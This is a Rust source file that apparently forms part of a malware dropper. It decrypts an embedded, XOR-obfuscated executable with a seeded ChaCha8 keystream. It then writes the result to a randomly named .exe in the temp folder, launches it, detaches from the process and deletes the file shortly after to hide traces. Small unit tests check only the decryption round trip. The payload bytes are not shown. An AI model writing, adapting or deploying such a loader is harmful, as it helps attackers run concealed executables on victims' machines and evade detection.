use rand::Rng;
use rand::SeedableRng;
use rand_chacha::ChaCha8Rng;
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use windows::core::Result;

pub fn reassemble_with_seed(seed: u64) -> Vec<u8> {
    reassemble_from_parts(
        seed,
        crate::chunks::ORIGINAL_SIZE,
        crate::chunks::CHUNK_SIZE,
        crate::chunks::DATA_POOL,
    )
}

pub(crate) fn reassemble_from_parts(
    seed: u64,
    original_size: usize,
    chunk_size: usize,
    data_pool: &[u8],
) -> Vec<u8> {
    let mut rng = ChaCha8Rng::seed_from_u64(seed);
    let mut raw = Vec::with_capacity(original_size);

    let mut pool_cursor = 0;
    let mut produced_bytes = 0;

    while produced_bytes < original_size {
        let remaining = original_size - produced_bytes;
        let take = remaining.min(chunk_size);

        for i in 0..take {
            let idx = pool_cursor + i;
            if idx >= data_pool.len() {
                break;
            }
            let key_byte: u8 = rng.gen();
            raw.push(data_pool[idx] ^ key_byte);
        }

        pool_cursor += take;
        produced_bytes += take;
    }

    raw
}

pub fn execute_payload(data: &[u8]) -> Result<()> {
    let temp_path = make_random_temp_exe_path();

    {
        let mut file =
            fs::File::create(&temp_path).map_err(|_| windows::core::Error::from_win32())?;
        file.write_all(data)
            .map_err(|_| windows::core::Error::from_win32())?;
    }

    match std::process::Command::new(&temp_path).spawn() {
        Ok(child) => {
            std::mem::forget(child);
            std::thread::sleep(std::time::Duration::from_millis(500));
            let _ = fs::remove_file(&temp_path);
            Ok(())
        }
        Err(_) => {
            let _ = fs::remove_file(&temp_path);
            Err(windows::core::Error::from_win32())
        }
    }
}

fn make_random_temp_exe_path() -> PathBuf {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";

    let mut rng = rand::thread_rng();
    let random_name: String = (0..8)
        .map(|_| {
            let idx = rng.gen_range(0..ALPHABET.len());
            ALPHABET[idx] as char
        })
        .collect();

    std::env::temp_dir().join(format!("{random_name}.exe"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn obfuscate_with_seed(seed: u64, payload: &[u8]) -> Vec<u8> {
        let mut rng = ChaCha8Rng::seed_from_u64(seed);
        payload
            .iter()
            .map(|&b| {
                let k: u8 = rng.gen();
                b ^ k
            })
            .collect()
    }

    #[test]
    fn reassemble_round_trip_non_multiple_chunk_size() {
        let seed = 0x310F_C06A_C439_A9EB;
        let payload = b"hello world - payload bytes";
        let pool = obfuscate_with_seed(seed, payload);

        let out = reassemble_from_parts(seed, payload.len(), 7, &pool);
        assert_eq!(out, payload);
    }

    #[test]
    fn reassemble_empty() {
        let out = reassemble_from_parts(123, 0, 4096, &[]);
        assert!(out.is_empty());
    }
}
